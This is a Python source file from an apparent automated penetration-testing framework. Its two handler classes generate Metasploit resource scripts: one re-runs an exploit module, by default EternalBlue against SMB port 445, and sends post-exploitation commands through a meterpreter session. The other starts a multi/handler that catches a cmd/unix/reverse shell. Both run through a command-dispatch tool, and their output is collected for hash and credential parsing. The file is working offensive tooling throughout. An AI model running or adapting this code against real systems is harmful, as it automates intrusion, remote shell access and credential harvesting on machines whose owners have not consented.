"""Metasploit-driven post-access handlers: meterpreter and raw shell."""

from __future__ import annotations

import textwrap
from typing import TYPE_CHECKING

from hydrasight.services.post_access.base import BasePostAccessHandler
from hydrasight.services.post_access.types import AccessType, PostAccessResult

if TYPE_CHECKING:
    from hydrasight.services.dispatcher import Dispatcher


class MeterpreterHandler(BasePostAccessHandler):
    """Post-access via a Metasploit meterpreter session.

    Re-runs the exploit module on a new port and executes post-exploitation
    commands via ``sessions -i -1 -C``.
    """

    access_type = AccessType.METERPRETER

    def execute(
        self,
        dispatcher: Dispatcher,
        target: str,
        lhost: str,
        lport: int,
        cfg: dict,
    ) -> PostAccessResult:
        payload = self.session.get("payload", "")
        is_windows = bool(payload and "windows" in payload.lower())
        module = self.session.get("module", "exploit/windows/smb/ms17_010_eternalblue")
        rport = int(self.session.get("rport", 445))
        cmds = self._default_commands(is_windows)

        cmd_block: list[str] = []
        for c in cmds.split(";"):
            c = c.strip()
            if c:
                cmd_block.append(f'sessions -i -1 -C "{c}"')
                cmd_block.append("sleep 4")

        is_aux = module.startswith("auxiliary/")
        payload_line = "" if (is_aux or not payload) else f"set PAYLOAD {payload}"
        action_line = "run" if is_aux else "exploit -z"

        rc_content = textwrap.dedent(f"""\
            use {module}
            set RHOSTS {target}
            set RPORT {rport}
            set LHOST {lhost}
            set LPORT {lport}
            {payload_line}
            set ExitOnSession false
            set WfsDelay 30
            set EnableStageEncoding true
            {action_line}
            sleep 10
            sessions -l
            {chr(10).join(cmd_block)}
            sleep 5
            sessions -K
            exit -y
        """)

        cmd = self._rc_to_command(rc_content, "/tmp/hs_post.rc")

        self.log.info("meterpreter post-access: %s lport %d", module, lport)
        try:
            _t_name, output, _ = dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": cmd}}
            )
        except Exception as exc:  # noqa: BLE001 — isolate per-handler dispatch failure
            self.log.error("meterpreter handler error: %s", exc)
            return PostAccessResult.failure(self.access_type, f"dispatch error: {exc}")

        return PostAccessResult(
            access_type=self.access_type,
            success=bool(output),
            output=output,
            hashes=[],  # caller (engine) parses hashes from output
            credentials=[],
            artifacts=[],
            notes=f"module={module} lport={lport}",
        )


class ShellHandler(BasePostAccessHandler):
    """Post-access via a raw reverse shell (cmd/unix/reverse, bash, nc, …).

    Builds a Metasploit multi/handler for the shell payload and runs
    post-access shell commands through the resulting session.
    """

    access_type = AccessType.SHELL

    def execute(
        self,
        dispatcher: Dispatcher,
        target: str,
        lhost: str,
        lport: int,
        cfg: dict,
    ) -> PostAccessResult:
        cmds = self._default_commands(is_windows=False)

        cmd_block: list[str] = []
        for c in cmds.split(";"):
            c = c.strip()
            if c:
                cmd_block.append(f'sessions -i -1 -C "{c}"')
                cmd_block.append("sleep 3")

        rc_content = textwrap.dedent(f"""\
            use multi/handler
            set PAYLOAD cmd/unix/reverse
            set LHOST {lhost}
            set LPORT {lport}
            set ExitOnSession false
            exploit -j -z
            sleep 15
            sessions -l
            {chr(10).join(cmd_block)}
            sleep 3
            sessions -K
            exit -y
        """)

        cmd = self._rc_to_command(rc_content, "/tmp/hs_shell.rc")

        self.log.info("shell post-access handler lport %d", lport)
        try:
            _, output, _ = dispatcher.dispatch({"tool": "run_command", "args": {"command": cmd}})
        except Exception as exc:  # noqa: BLE001 — isolate per-handler dispatch failure
            self.log.error("shell handler error: %s", exc)
            return PostAccessResult.failure(self.access_type, f"dispatch error: {exc}")

        return PostAccessResult(
            access_type=self.access_type,
            success=bool(output),
            output=output,
            hashes=[],
            credentials=[],
            artifacts=[],
            notes=f"shell reverse lport={lport}",
        )
